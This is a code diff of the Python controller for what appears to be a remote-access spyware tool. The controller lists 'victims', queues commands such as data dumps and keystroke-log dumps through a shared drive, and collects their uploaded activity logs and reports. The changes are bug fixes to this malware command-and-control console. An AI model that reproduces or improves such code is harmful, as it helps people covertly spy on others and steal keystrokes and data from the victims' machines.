@@ -10,7 +10,6 @@ from server.util import force_stop
 
 from server.drive import (backup, drive_file, source_drive, move_file, drive)
 import server.drive as _d
-import atexit
 import string
 from threading import Thread
 from time import sleep
@@ -277,8 +276,8 @@ class Home:
         self.total_page=ceil(len(victims)/self.single_page) # 0 indexed for scroll bar
         
     def resize(self):
-        log.info('resturcting the whole home page')
-        self.print_status()        
+        log.debug('resturcting the whole home page')
+        self.print_status()
 
         self.calculate()
         self.print_page()
@@ -428,17 +427,18 @@ class Home:
         for uname in new_victims:
             # move registered file to the host
             upath=join(vic_path, uname)
-            move_file(upath)
+            move_file(upath)# half confirm
             with drive_file(upath) as f:# repair command_sec if needed
                 command_sec=f.read()['last_user_time']
                 if last_time[uname]<command_sec:
                     last_time[uname]=command_sec
                     log.warning(f'0_o repaired wrong command_sec for victim: {uname}')
+                    # repairing command_sec also need to discard some commands.
             
             # move files that uploaded when ever a victims got actime
             file = "activity.log"
             file = f"reports/{uname}/{file}"
-            move_file(file)
+            move_file(file)# half confirm
 
         update_list(victims, new_victims)
         
@@ -470,8 +470,11 @@ def remove_command(uname, ctime):
     ctime=int(ctime)
     modify_command.acquire()
     with drive_file(command_file) as f:
-        commands:list = f.read()
-    
+        commands = f.read()# dict
+    if not commands:
+        log.error(f"remove_command {uname}-{ctime} fail. reason: null command file")
+        return
+
     for command in commands[uname]:
         if command['time']==ctime:
             commands[uname].remove(command)
@@ -495,20 +498,25 @@ reports={
 def listener():
     while 1:
         home_page.refresh()
-        for user in victims:
-            response=f"reports/{user}/response"
+        for uname in victims:
+            response=f"reports/{uname}/response"
             for ctime in source_drive.list_files(response):
                 remove_command(uname, ctime)
                 response_file=join(response, ctime)
-                move_file(response_file)
+                move_file(response_file)# confirm
 
                 with drive_file(response_file) as f:
-                    func=f.read(response_file)
+                    func=f.read()
+                func=func.strip('\n\t ')# rsptrip is also enough
                 file_name=reports[func]
                 file_name=f"{file_name[0]}_{ctime}.{file_name[-1]}"
+                
                 path=f"reports\{uname}\{file_name}"
                 with modify_command:
                     listen_for.append(path)
+                data_store.commit()
+                sleep(1)
+            sleep(.5)
 
         for i in listen_for:
             if not source_drive.exists(i):
@@ -519,10 +527,11 @@ def listener():
             log.info(f'file listener found a file from victim "{uname}" ')
             log.debug(f'full file path: {i}')
             
-            move_file(i)
+            move_file(i)# confirm
             remove_command(uname, ctime)
+            sleep(1)
 
-        sleep(10)
+        sleep(5)
 
 class Tokener:
     def __init__(self):
@@ -545,14 +554,15 @@ class Tokener:
         if not self.running:
             return
 
-        log.info('stoping token rovider')
+        log.info('stoping token provider')
+        self.bucket.close()
         with drive_file(token_file) as f:# clean the token file
             f.rewrite("")
         force_stop(self.core)
         force_stop(self.listen)
         
         for file in drive.list_files(vic_path):# backup registered victimes name
-            backup(file)
+            backup(join(vic_path, file))
         
         _d.secure_mod=True
         self.__init__()
@@ -573,21 +583,21 @@ class Tokener:
         log.debug('token received from the bucket')
         if _d.secure_mod:
             log.info("auto refresh activated. please wait for the victims to register their names.")
-            home_page.print_status()
             self.listen.start()
             _d.secure_mod=False
+            home_page.print_status()
         
         return dict(token)# netrif.type --> local dict
 
     def update_token(self):
         log.debug('trying to connect with the bucket')
         try:
-            conn=connect('localhost', bucket_port)
+            self.bucket=connect('localhost', bucket_port)
         except ConnectionRefusedError:
             log.error('token provider can\'t start because bucket is not running.')
             self.__init__()
             return
-        self.tokens=conn.root
+        self.tokens=self.bucket.root
         
         while 1:
             with drive_file(token_file) as f:
@@ -743,8 +753,7 @@ class action:
         self.vic_name = vic_name
         self.last_time = last_time.get(vic_name, 0)
         self.commands=[]# also this one # previous command that is not responsed
-        self.listen_for=[]
-        
+
         clear()
         sh, sw = window.getmaxyx()
         opt_box = OrderedDict({
@@ -787,15 +796,13 @@ class action:
         command={
             "func":"dump"
         }
-        sec=self.stage(command)
-        self.add_to_listen(f'dump_{sec}.json')
+        self.stage(command)
 
     def stored_value(self):
         command={
             "func":"stored_value"
         }
-        sec = self.stage(command)
-        self.add_to_listen(f'data_store_{sec}.json')
+        self.stage(command)
 
     def set_value(self):
         from clint.util import Values
@@ -859,27 +866,21 @@ class action:
                 "max_size":size
             }
         }
-        sec = self.stage(command)
-        self.add_to_listen(f'key_dump_{sec}.log')
+        self.stage(command)
         clear()
 
     def discard(self):
         log.warning('all changes resolved.')
         self.commands.clear()
-        self.listen_for.clear()
+        self.last_time=last_time[self.vic_name]
 
     def clean_record(self):
         log.warning('all listed commands removed from command_file')
         with drive_file(command_file) as f, modify_command:
             
-            full_com:dict=f.read() or "{}"
+            full_com:dict=f.read() or {}
             full_com.pop(self.vic_name, None)
             f.rewrite(full_com)
-
-
-    def add_to_listen(self, file_name:str, prefix="reports"):
-        path=f"{prefix}\{self.vic_name}\{file_name}"
-        self.listen_for.append(path)
 
 
     def included(self, command):
@@ -918,7 +919,7 @@ class action:
             return
 
         with drive_file(command_file) as f, modify_command:
-            full_com:dict=f.read() or "{}"
+            full_com:dict=f.read() or {}
             pre_com=full_com.get(self.vic_name, [])
 
             self.extend(pre_com)
@@ -926,7 +927,6 @@ class action:
             f.rewrite(full_com)
 
             last_time[self.vic_name]=self.last_time
-            update_list(listen_for, self.listen_for)
             data_store.commit()
         return
 
@@ -944,4 +944,3 @@ if __name__=="__main__":
     # middle_print_str(window, "enter numbers: ")
     # p=user_input()
     # print(p)
-    
